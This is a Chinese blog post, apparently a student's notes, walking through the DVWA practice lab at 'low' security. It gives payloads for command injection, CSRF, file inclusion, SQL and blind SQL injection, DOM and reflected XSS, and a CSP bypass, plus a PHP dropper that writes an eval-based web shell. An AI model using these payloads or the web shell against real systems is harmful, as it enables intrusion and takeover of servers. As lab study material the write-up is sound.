@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="can&#39;t predict the result, just try">
+  <meta name="author" content="lyly">
+  <meta name="keywords" content="">
+  <title>DVWA-low - codegirl&#39;Diary</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>lyly</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-05-30 14:40">
+      May 30, 2020 pm
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <h5 id="brute-force"><a href="#brute-force" class="headerlink" title="brute-force:"></a>brute-force:</h5><p>就是对进行字典比对。<br><img src="/2020/05/30/DVWA-low/2.png" srcset="/img/loading.gif" alt="Alt text"></p>
+<hr>
+![Alt text](./3.png)
+<hr>
+![Alt text](./1.png)
+<hr>
+![Alt text](./4.png)
+<hr>
+![Alt text](./5.png)
+![Alt text](./6.png)
+#####  Command Execution:
+因为没有对用户输入进行处理，一些命令中特殊的执行字符执行多个语句，从而实现添加用户等等。
+能够通过
+<pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;&amp;ipconfig</code></pre>
+显示的就是相关ip网关等等![Alt text](./2-1.png)
+但是电脑自己禁止了net user  /add这些，可以通过虚拟机重新搭建环境实现。
+##### csrf：
+跨站请求伪造攻击，在用户没有无意识的情况盗用用户身份进行攻击。
+进行抓包能够看到请求链接为``/DVWA-master/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change HTTP/1.1``
+- 检测漏洞：没有token，去掉referer能够正常执行。
+- 利用：
+![Alt text](./csrf-1.png)
+
+<p>在自己的网站设置一个img的src为<code>http://192.168.139.227/DVWA-master/vulnerabilities/csrf/</code><br><img src="/2020/05/30/DVWA-low/csrf-3.png" srcset="/img/loading.gif" alt="Alt text"></p>
+<p>模拟用户进行网站的点击<br><img src="/2020/05/30/DVWA-low/csrf-2.png" srcset="/img/loading.gif" alt="Alt text"><br>退出dvwa重新登录可以看到，密码已经被修改。</p>
+<h5 id="file-including："><a href="#file-including：" class="headerlink" title="file including："></a>file including：</h5><p>服务器·执行php文件时，可以通过include等函数实现另一个代码的执行。</p>
+<ul>
+<li>本地文件包含：<br>在dvwa下的phpinfo(知道文件路径)<br>(该路径能够执行php等文件)<pre><code class="hljs awk"><span class="hljs-regexp">/DVWA-master/</span>vulnerabilities<span class="hljs-regexp">/fi/</span>?page=..<span class="hljs-regexp">/../</span>phpinfo.php</code></pre>
+<img src="/2020/05/30/DVWA-low/wen-1.png" srcset="/img/loading.gif" alt="Alt text"><br><img src="/2020/05/30/DVWA-low/wen-2.png" srcset="/img/loading.gif" alt="Alt text"><br>搭配文件上传食用</li>
+<li>远程文件包含<br>在网站放一个木马<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?PHP</span> fputs(fopen(<span class="hljs-string">'shell.php'</span>,<span class="hljs-string">'w'</span>),<span class="hljs-string">'&lt;?php @eval($_POST[\'cmd\']);?&gt;'</span>);<span class="hljs-meta">?&gt;</span></span></code></pre>
+能够进行正常访问：<br><img src="/2020/05/30/DVWA-low/wen-3.png" srcset="/img/loading.gif" alt="Alt text"><br>用蚁剑进行连接：<img src="/2020/05/30/DVWA-low/web-4.png" srcset="/img/loading.gif" alt="Alt text"><h5 id="file-upload："><a href="#file-upload：" class="headerlink" title="file upload："></a>file upload：</h5>直接上传一个木马<br>然后用蚁剑连接就ok了<br><img src="/2020/05/30/DVWA-low/wen-5.png" srcset="/img/loading.gif" alt="Alt text"><br><img src="/2020/05/30/DVWA-low/wen-6.png" srcset="/img/loading.gif" alt="Alt text"><h5 id="Insecure-CAPTCHA："><a href="#Insecure-CAPTCHA：" class="headerlink" title="Insecure CAPTCHA："></a>Insecure CAPTCHA：</h5>没有办法访问到google验证码后面补上<h5 id="sql"><a href="#sql" class="headerlink" title="sql:"></a>sql:</h5></li>
+<li>确定注入类型并且是否带括号：<br><img src="/2020/05/30/DVWA-low/sql-1.png" srcset="/img/loading.gif" alt="Alt text"><br>确定为单引号无括号类型，并且有正确和错误信息回显<pre><code class="hljs lsl"><span class="hljs-number">2</span><span class="hljs-string">" or "</span><span class="hljs-number">1</span><span class="hljs-string">"="</span><span class="hljs-number">2</span>
+#如果没有括号返回值就是id=<span class="hljs-number">2</span>的信息
+#如果有括号则是返回id=<span class="hljs-number">1</span></code></pre></li>
+<li>构造注入语句<br>因为没有什么过滤机制，基本思路就是判断注入方法，查询字段<img src="/2020/05/30/DVWA-low/sql-2.png" srcset="/img/loading.gif" alt="Alt text"><br><img src="/2020/05/30/DVWA-low/sql-3.png" srcset="/img/loading.gif" alt="Alt text"><pre><code class="hljs gauss"><span class="hljs-number">0</span>' <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-built_in">database</span>(),<span class="hljs-number">2</span>'</code></pre></li>
+<li>判断数据库（schema_name）</li>
+<li>判断表(table_name)</li>
+<li>判断字段</li>
+<li>循环输出</li>
+</ul>
+<p>源码分析：</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_REQUEST[ <span class="hljs-string">'Submit'</span> ] ) ) &#123;
+    <span class="hljs-comment">// Get input</span>
+    $id = $_REQUEST[ <span class="hljs-string">'id'</span> ];
+
+    <span class="hljs-comment">// 进行查询数据库</span>
+    
+    $query  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;
+<span class="hljs-comment">//SELECT first_name, last_name FROM users WHERE user_id = '   0' union select database(),2 --+ ';</span>
+<span class="hljs-comment">#虽然用--+注释了后面的单引号，但是在双引号中就是一个字符串，最后存在多余的单引号就会出现报错。--+并没有起很大作用</span>
+    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );
+
+    <span class="hljs-comment">// Get results</span>
+    <span class="hljs-keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;
+        <span class="hljs-comment">// Get values</span>
+        $first = $row[<span class="hljs-string">"first_name"</span>];
+        $last  = $row[<span class="hljs-string">"last_name"</span>];
+
+        <span class="hljs-comment">// Feedback for end user</span>
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;
+    &#125;
+
+    mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]);
+&#125;
+
+<span class="hljs-meta">?&gt;</span></code></pre>
+<h5 id="sql-blind"><a href="#sql-blind" class="headerlink" title="sql blind:"></a>sql blind:</h5><ul>
+<li>页面显示特征：<br>有判断id是否存在数据库</li>
+<li>判断注入类型以及是否存在括号：<br>没有括号的单引号注入</li>
+<li>判断注入方式：<br>因为没有具体回显，但是存在正错回显，锁定布尔盲注</li>
+<li>构造注入语句：<pre><code class="hljs ada">?id=<span class="hljs-number">1</span>' <span class="hljs-keyword">and</span> left((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>)=<span class="hljs-symbol">'d</span></code></pre>
+<img src="/2020/05/30/DVWA-low/sql-4.png" srcset="/img/loading.gif" alt="Alt text"><h5 id="Weak-Session-IDs：靶场问题后面补"><a href="#Weak-Session-IDs：靶场问题后面补" class="headerlink" title="Weak Session IDs：靶场问题后面补"></a>Weak Session IDs：靶场问题后面补</h5><h5 id="xss-dom："><a href="#xss-dom：" class="headerlink" title="xss dom："></a>xss dom：</h5></li>
+<li>判断xss类型：f12找inner，document.write()之类的函数</li>
+<li>script解读：<pre><code class="hljs livescript"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">document</span>.location.href.indexOf(<span class="hljs-string">"default="</span>) &gt;= <span class="hljs-number">0</span>) &#123;
+						<span class="hljs-keyword">var</span> lang = <span class="hljs-built_in">document</span>.location.href.substring(<span class="hljs-built_in">document</span>.location.href.indexOf(<span class="hljs-string">"default="</span>)+<span class="hljs-number">8</span>);
+<span class="hljs-comment">#判断是否存在选项，取default=后面的值</span>
+						<span class="hljs-built_in">document</span>.write(<span class="hljs-string">"&lt;option value='"</span> + lang + <span class="hljs-string">"'&gt;"</span> + decodeURI(lang) + <span class="hljs-string">"&lt;/option&gt;"</span>);
+<span class="hljs-comment">#将值写入页面中</span>
+			<span class="hljs-built_in">document</span>.write(<span class="hljs-string">"&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;"</span>);
+					&#125;
+<span class="hljs-comment">#下拉列表的值					    </span>
+					<span class="hljs-built_in">document</span>.write(<span class="hljs-string">"&lt;option value='English'&gt;English&lt;/option&gt;"</span>);
+					<span class="hljs-built_in">document</span>.write(<span class="hljs-string">"&lt;option value='French'&gt;French&lt;/option&gt;"</span>);
+					<span class="hljs-built_in">document</span>.write(<span class="hljs-string">"&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;"</span>);
+					<span class="hljs-built_in">document</span>.write(<span class="hljs-string">"&lt;option value='German'&gt;German&lt;/option&gt;"</span>);</code></pre>
+所以能够进行dom型xss，将构造语句和选项在default中<img src="/2020/05/30/DVWA-low/dom-1.png" srcset="/img/loading.gif" alt="Alt text"><pre><code class="hljs xquery"><span class="hljs-keyword">default</span>=&lt;/<span class="hljs-keyword">option</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span></span></code></pre>
+<img src="/2020/05/30/DVWA-low/dom-2.png" srcset="/img/loading.gif" alt="Alt text"><br>进行option闭合，如果想直接使用onclick之类的，进行了编码，无法实现双引号闭合。<h5 id="xss-reflect："><a href="#xss-reflect：" class="headerlink" title="xss reflect："></a>xss reflect：</h5>观察审查元素，输入123，是直接显示在页面，通过闭合<code>&lt;pre&gt;</code><br><img src="/2020/05/30/DVWA-low/re-1.png" srcset="/img/loading.gif" alt="Alt text"><br><img src="/2020/05/30/DVWA-low/re-2.png" srcset="/img/loading.gif" alt="Alt text"><br>插入成功并且出现了弹窗<h5 id="store-xss："><a href="#store-xss：" class="headerlink" title="store xss："></a>store xss：</h5>能够存储在页面中，用户访问一刷新就会执行的xss<img src="/2020/05/30/DVWA-low/s-1.png" srcset="/img/loading.gif" alt="Alt text"></li>
+</ul>
+<h5 id="csp绕过："><a href="#csp绕过：" class="headerlink" title="csp绕过："></a>csp绕过：</h5><p>csp：浏览器安全策略(Content-Security-Policy是指HTTP返回报文头中的标签，浏览器会根据标签中的内容，判断哪些资源可以加载或执行。白名单思想，用来防止xss)</p>
+<pre><code class="hljs routeros">1.<span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">"Content-Security-Policy"</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">"script-src 'self'; </span>
+<span class="hljs-string">2.通过HTTP相应头信息的Content-Security-Policy字段</span></code></pre>
+<p>在请求头中</p>
+<pre><code class="hljs 1c">script-src 'self' https:<span class="hljs-comment">//pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;</span>
+<span class="hljs-meta">#能够访问的就是其中的url，在https:<span class="hljs-comment">//pastebin.com/raw/VqHmJKjr是一个js代码</span></span></code></pre>
+<p>请求头确定好允许访问的页面，就可以开始攻击了<br><img src="/2020/05/30/DVWA-low/csp-1.png" srcset="/img/loading.gif" alt="Alt text"><br><img src="/2020/05/30/DVWA-low/csp-2.png" srcset="/img/loading.gif" alt="Alt text"></p>
+<h5 id="js"><a href="#js" class="headerlink" title="js:"></a>js:</h5><p>这一关就是对token修改的js执行<br><img src="/2020/05/30/DVWA-low/js-1.png" srcset="/img/loading.gif" alt="Alt text">将changeme修改为success<br>然后再console执行js<br><img src="/2020/05/30/DVWA-low/js-2.png" srcset="/img/loading.gif" alt="Alt text"><br>MD5算法计算出新的token然后执行就能够成功了。</p>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">小弟，内容有理解错的，联系我吧~</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/05/25/csrf/">
+                        <span class="hidden-mobile">csrf漏洞</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://lylysay.github.io/" target="_blank" rel="nofollow noopener"><span>home</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://www.baidu.com" target="_blank" rel="nofollow noopener">
+        <span>baidu</span></a>
+    </div>
+    
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "DVWA-low&nbsp;",
+      ],
+      cursorChar: "",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+  
+  
+    <script>
+      !function (e, t, a) {
+        function r() {
+          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
+          requestAnimationFrame(r)
+        }
+
+        function n() {
+          var t = "function" == typeof e.onclick && e.onclick;
+          e.onclick = function (e) {
+            t && t(), o(e)
+          }
+        }
+
+        function o(e) {
+          var a = t.createElement("div");
+          a.className = "heart", s.push({
+            el: a,
+            x: e.clientX - 5,
+            y: e.clientY - 5,
+            scale: 1,
+            alpha: 1,
+            color: c()
+          }), t.body.appendChild(a)
+        }
+
+        function i(e) {
+          var a = t.createElement("style");
+          a.type = "text/css";
+          try {
+            a.appendChild(t.createTextNode(e))
+          } catch (t) {
+            a.styleSheet.cssText = e
+          }
+          t.getElementsByTagName("head")[0].appendChild(a)
+        }
+
+        function c() {
+          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+        }
+
+        var s = [];
+        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
+          setTimeout(e, 1e3 / 60)
+        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
+      }(window, document);
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
